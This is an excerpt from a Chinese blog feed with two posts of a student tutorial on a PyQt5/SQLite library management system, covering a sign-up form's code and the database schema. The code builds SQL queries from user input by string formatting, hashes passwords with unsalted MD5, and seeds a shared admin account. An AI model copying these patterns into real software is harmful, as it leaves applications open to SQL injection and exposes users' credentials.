SignUp(self):</span><br><span class="line">        studentId &#x3D; self.studentIdLineEdit.text()</span><br><span class="line">        studentName &#x3D; self.studentNameLineEdit.text()</span><br><span class="line">        password &#x3D; self.passwordLineEdit.text()</span><br><span class="line">        confirmPassword &#x3D; self.passwordConfirmLineEdit.text()</span><br><span class="line">        if (studentId &#x3D;&#x3D; &quot;&quot; or studentName &#x3D;&#x3D; &quot;&quot; or password &#x3D;&#x3D; &quot;&quot; or confirmPassword &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;表单不可为空，请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        else:  # 需要处理逻辑，1.账号已存在;2.密码不匹配;3.插入user表</span><br><span class="line">            db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">            db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">            db.open()</span><br><span class="line">            query &#x3D; QSqlQuery()</span><br><span class="line">            if (confirmPassword !&#x3D; password):</span><br><span class="line">                print(QMessageBox.warning(self, &quot;警告&quot;, &quot;两次输入密码不一致，请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">                return</span><br><span class="line">            elif (confirmPassword &#x3D;&#x3D; password):</span><br><span class="line">                # md5编码</span><br><span class="line">                hl &#x3D; hashlib.md5()</span><br><span class="line">                hl.update(password.encode(encoding&#x3D;&#39;utf-8&#39;))</span><br><span class="line">                md5password &#x3D; hl.hexdigest()</span><br><span class="line">                sql &#x3D; &quot;SELECT * FROM user WHERE StudentId&#x3D;&#39;%s&#39;&quot; % (studentId)</span><br><span class="line">                query.exec_(sql)</span><br><span class="line">                if (query.next()):</span><br><span class="line">                    print(QMessageBox.warning(self, &quot;警告&quot;, &quot;该账号已存在,请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">                    return</span><br><span class="line">                else:</span><br><span class="line">                    sql &#x3D; &quot;INSERT INTO user VALUES (&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,0,0,0)&quot; % (</span><br><span class="line">                        studentId, studentName, md5password)</span><br><span class="line">                    db.exec_(sql)</span><br><span class="line">                    db.commit()</span><br><span class="line">                    print(QMessageBox.information(self, &quot;提醒&quot;, &quot;您已成功注册账号!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">                    self.student_signup_signal.emit(studentId)</span><br><span class="line">                db.close()</span><br><span class="line">                return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; SignUpWidget()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><ul><li>setUpUI用来初始化UI界面</li><li>signUp实现在注册过程中的逻辑以及对数据库的操作，按理说应该把数据库操作单独写一个模块的，不过我很懒…</li><li>注册成功暂时只是把数据插入了数据库，本来应该加上跳转页面之类的操作</li><li>如果觉得黑色的效果很好看的话，大家也可以调用经典的QSSstyle表qdarkstyle<br>##实现效果<br><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gdb895cqldj30p40hj0t5.jpg" alt="Alt text"></li></ul><p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gdb896b8o1j30p40hj0t5.jpg" alt="Alt text"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（1）——数据库</title>
    <url>/51f03b47.html</url>
    <content><![CDATA[<p>PS:由于CSDN太多广告所以弃用了，搬运到了自己的博客</p><h2><span id="pxie-zai-qian-mian">写在前面</span><a href="#pxie-zai-qian-mian" class="header-anchor">#</a></h2><p>这学期的数据库大作业要求是做一个简单的图书馆管理系统，刚好之前看过Qt，就打算用Qt来写了，博客记录一些重要的模块和思路</p><h2><span id="pyao-qiu">要求</span><a href="#pyao-qiu" class="header-anchor">#</a></h2><p>编写一个图书管理系统，要求具有以下内容：</p><ul><li>存储图书信息、采购和淘汰情况、租借情况</li><li>实现图书采购、淘汰、租借功能。</li><li>实现图书信息、采购和淘汰、库存、和租借情况查询</li><li>实现图书的采购、库存、淘汰、租借情况等统计</li></ul><p>这是要实现的基本功能，当然我觉得做好的话还可以加上读者推荐书目，我喜欢，收藏书目之类的功能</p><a id="more"></a><h2><span id="pda-zhi-si-lu">大致思路</span><a href="#pda-zhi-si-lu" class="header-anchor">#</a></h2><p>作为一个管理系统，自然要实现管理员和学生两个方面的内容</p><ul><li>首先需要登录和注册页面</li><li>对于管理员，在管理员的管理页面上，会实现图书的采购，淘汰，库存，租借情况查询及统计</li><li>对于学生，要实现图书的借阅、归还、租借情况查询</li></ul><h2><span id="pshu-ju-ku">数据库</span><a href="#pshu-ju-ku" class="header-anchor">#</a></h2><p>使用Sqlite3轻量级数据库作为系统的数据库</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE User (</span><br><span class="line">  StudentId     CHAR(10) UNIQUE NOT NULL,</span><br><span class="line">  Name          VARCHAR(20),</span><br><span class="line">  Password      CHAR(32)        NOT NULL,</span><br><span class="line">  IsAdmin       BIT DEFAULT 0,</span><br><span class="line">  TimesBorrowed INT DEFAULT 0,</span><br><span class="line">  NumBorrowed   INT DEFAULT 0</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">CREATE TABLE Book (</span><br><span class="line">  BookName     VARCHAR(30) NOT NULL,</span><br><span class="line">  BookId       CHAR(6)     NOT NULL,</span><br><span class="line">  Auth         VARCHAR(20) NOT NULL,</span><br><span class="line">  Category     VARCHAR(10) DEFAULT NULL,</span><br><span class="line">  Publisher    VARCHAR(30) DEFAULT NULL,</span><br><span class="line">  PublishTime  DATE,</span><br><span class="line">  NumStorage   INT         DEFAULT 0,</span><br><span class="line">  NumCanBorrow INT         DEFAULT 0,</span><br><span class="line">  NumBorrowed  INT         DEFAULT 0</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">CREATE TABLE User_Book (</span><br><span class="line">  StudentId   CHAR(10) UNIQUE NOT NULL,</span><br><span class="line">  BookId      CHAR(6)         NOT NULL,</span><br><span class="line">  BorrowTime  DATE,</span><br><span class="line">  ReturnTime  DATE,</span><br><span class="line">  BorrowState BIT DEFAULT 0</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">CREATE TABLE BuyOrDrop (</span><br><span class="line">  BookId    CHAR(6) NOT NULL,</span><br><span class="line">  Time      DATE,</span><br><span class="line">  BuyOrDrop BIT DEFAULT 0,</span><br><span class="line">  Number    INT DEFAULT 0</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">INSERT INTO User VALUES (&#39;0000000000&#39;, &#39;管理员&#39;, &#39;f9687b82c237c8868a92ffa548c0a16a&#39;, 1, 0, 0);</span><br></pre></td></tr></table></figure><blockquote><p>所有管理员使用同一账户 ，password使用md5加密</p></blockquote><h3><span id="puser-biao">User表</span><a href="#puser-biao" class="header-anchor">#</a></h3><ul><li>StudentId：学号</li><li>Name：姓名</li><li>Password：密码</li><li>IsAdmin：是否为管理员</li><li>TimesBorrowed：借阅次数</li><li>NumBorrowed：已借书数量<br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb7q1ougaj30zc02l74i.jpg" alt="Alt text"></li></ul><h3><span id="pbook-biao">Book表</span><a href="#pbook-biao" class="header-anchor">#</a></h3><ul><li>BookName：书名</li><li>BookId：书号</li><li>Auth：作者</li><li>CateGory：分类</li><li>Publisher：出版社</li><li>PublishTime：出版时间</li><li>NumStorage：库存量</li><li>NumCanBorrowed：可借量</li><li>NumBorrowed：被借阅次数</li></ul><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb7ri0ls0j313901zdg9.jpg" alt="Alt text"></p><h3><span id="puser-book-biao">User_Book表</span><a href="#puser-book-biao" class="header-anchor">#</a></h3><p>分别为学号，书号，借阅时间，归还时间，借阅状态</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb7rnz07cj30o902o74g.jpg" alt="Alt text"></p><h3><span id="pbuyordrop-biao">BuyOrDrop表</span><a href="#pbuyordrop-biao" class="header-anchor">#</a></h3><p>分别为书号，添加或淘汰时间，添加还是淘汰，数量<br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb7q2jlagj30hn03jt8r.jpg" alt="Alt text"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
</search>
